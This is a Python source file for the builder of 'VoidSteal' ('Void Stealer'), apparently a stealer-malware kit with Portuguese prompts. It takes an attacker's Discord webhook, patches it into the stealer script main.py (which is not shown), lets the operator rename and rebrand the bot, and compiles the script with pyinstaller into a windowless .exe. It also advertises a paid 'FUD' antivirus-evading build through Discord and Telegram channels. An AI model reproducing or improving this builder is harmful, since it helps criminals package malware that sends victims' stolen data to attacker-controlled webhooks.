from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

 ▄               ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄        ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄ 
▐░▌             ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌      ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
 ▐░▌           ▐░▌ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌
  ▐░▌         ▐░▌  ▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌
   ▐░▌       ▐░▌   ▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
    ▐░▌     ▐░▌    ▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
     ▐░▌   ▐░▌     ▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ 
      ▐░▌ ▐░▌      ▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌     ▐░▌          ▐░▌               ▐░▌     
       ▐░▐░▌       ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌               ▐░▌     
        ▐░▌        ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌      ▐░░░░░░░░░░░▌▐░▌               ▐░▌     
         ▀          ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀        ▀▀▀▀▀▀▀▀▀▀▀  ▀                 ▀      
                                                                                                      

       ╔═══════════════════════════════╗  ╔════════════════════════════════╗
       ║ https://discord.gg/l9brasil   ║  ║ https://discord.gg/l9brasil    ║  
       ╚═══════════════════════════════╝  ╚════════════════════════════════╝    
                        ╔═══════════════════════════════╗
                        ║    https://t.me/voidepy    ║ 
                        ╚═══════════════════════════════╝
        
            
            - Press Enter                                         
"""
    
Anime.Fade(Center.Center(intro), Colors.rainbow, Colorate.Vertical, interval=0.020, enter=True)


print(f"""{Fore.LIGHTRED_EX}

 ██      ██   ███████   ██ ███████     ████████ ███████  ██    ██
░██     ░██  ██░░░░░██ ░██░██░░░░██   ░██░░░░░ ░██░░░░██░░██  ██ 
░██     ░██ ██     ░░██░██░██    ░██  ░██      ░██   ░██ ░░████  
░░██    ██ ░██      ░██░██░██    ░██  ░███████ ░███████   ░░██   
 ░░██  ██  ░██      ░██░██░██    ░██  ░██░░░░  ░██░░░░     ░██   
  ░░████   ░░██     ██ ░██░██    ██   ░██      ░██         ░██   
   ░░██     ░░███████  ░██░███████    ░████████░██         ░██   
    ░░       ░░░░░░░   ░░ ░░░░░░░     ░░░░░░░░ ░░          ░░    


                    > Bem vindo ao VoidSteal.
""")

time.sleep(1)


while True:
    print("\nQual opção você deseja escolher: ", Fore.RED)
    print("\n1. Criar .exe", Fore.RED)
    print("\n2. Criar .exe Customizável", Fore.RED)
    print("\n3. Criar .exe FUD", Fore.RED)
    print("\n4. Fechar o Construtor", Fore.RED)
    print("\nFaça sua escolha: ", Fore.RED, end="")
    escolha = input()

    if escolha == "1":
        os.system("cls || clear")
        webhook = input(Fore.RED + "\nDigite seu Webhook: " + Style.RESET_ALL)

        nome_arquivo = "main.py"
        caminho_arquivo = os.path.join(os.getcwd(), nome_arquivo)
        with open(caminho_arquivo, "r", encoding="utf-8") as f:
            conteudo = f.read()
        novo_conteudo = conteudo.replace('"SEU WEBHOOK AQUI"', f'"{webhook}"')
        with open(caminho_arquivo, "w", encoding="utf-8") as f:
            f.write(novo_conteudo)
        print(f"\nArquivo {nome_arquivo} atualizado.", Fore.RED)

        ofuscar = False

        while True:
            resposta = input(Fore.RED + "\nDeseja criar o arquivo .exe? (S/N) " + Style.RESET_ALL)
            if resposta.upper() == "S":
                if not ofuscar:
                    cmd = f"pyinstaller --onefile --windowed {nome_arquivo}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {nome_arquivo} --name {nome_arquivo.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                print(f"\nO arquivo {nome_arquivo} foi convertido para .exe.", Fore.RED)
                break
            elif resposta.upper() == "N":
                break
            else:
                print("\nVocê digitou uma opção inválida. Por favor, tente novamente.", Fore.RED)

    elif escolha == "2": 
        resposta = input(Fore.RED + "\nDeseja alterar a foto de perfil do VoidSteal? (S/N) " + Style.RESET_ALL)
        if resposta.upper() == "S":
            os.system("cls || clear")
            pfp = input(Fore.RED + "\nDigite o Link da Nova Foto de Perfil: " + Style.RESET_ALL)

            nome_arquivo = "main.py"
            caminho_arquivo = os.path.join(os.getcwd(), nome_arquivo)
            with open(caminho_arquivo, "r", encoding="utf-8") as f:
                conteudo = f.read()
            novo_conteudo = conteudo.replace('"https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&"', f'"{pfp}"')
            with open(caminho_arquivo, "w", encoding="utf-8") as f:
                f.write(novo_conteudo)
            print(f"\nArquivo {nome_arquivo} atualizado.", Fore.RED)

        elif resposta.upper() == "N":
            continue

        resposta = input(Fore.RED + "\nDeseja alterar o nome do VoidSteal? (S/N) " + Style.RESET_ALL)
        if resposta.upper() == "S":
            os.system("cls || clear")
            novo_nome = input(Fore.RED + "\nDigite o Novo Nome: " + Style.RESET_ALL)

            nome_arquivo = "main.py"
            caminho_arquivo = os.path.join(os.getcwd(), nome_arquivo)
            with open(caminho_arquivo, "r", encoding="utf-8") as f:
                conteudo = f.read()
            novo_conteudo = conteudo.replace('"Void Stealer | t.me/voidepy"', f'"{novo_nome}"')
            with open(caminho_arquivo, "w", encoding="utf-8") as f:
                f.write(novo_conteudo)
            print(f"\nArquivo {nome_arquivo} atualizado.", Fore.RED)

        elif resposta.upper() == "N":
            continue

        webhook = input(Fore.RED + "\nDigite seu Webhook: " + Style.RESET_ALL)
        nome_arquivo = "main.py"
        caminho_arquivo = os.path.join(os.getcwd(), nome_arquivo)
        with open(caminho_arquivo, "r", encoding="utf-8") as f:
            conteudo = f.read()
        novo_conteudo = conteudo.replace('"SEU WEBHOOK AQUI"', f'"{webhook}"')
        with open(caminho_arquivo, "w", encoding="utf-8") as f:
            f.write(novo_conteudo)
        print(f"\nArquivo {nome_arquivo} atualizado.", Fore.RED)

        ofuscar = False

        while True:
            resposta = input(Fore.RED + "\nDeseja criar o arquivo .exe? (S/N) " + Style.RESET_ALL)
            if resposta.upper() == "S":
                if not ofuscar:
                    cmd = f"pyinstaller --onefile --windowed {nome_arquivo}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {nome_arquivo} --name {nome_arquivo.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                print(f"\nO arquivo {nome_arquivo} foi convertido para .exe.", Fore.RED)
                break
            elif resposta.upper() == "N":
                break
            else:
                print("\nVocê digitou uma opção inválida. Por favor, tente novamente.", Fore.RED)

    elif escolha == "3":
        print("\nVocê pode comprar o FUD em nosso servidor do Discord. | discord.gg/l9brasil", Fore.RED)

    elif escolha == "4":
        print("\nEncerrando o programa...", Fore.RED)
        break

    else:
        print("\nVocê digitou uma opção inválida. Por favor, tente novamente.", Fore.RED)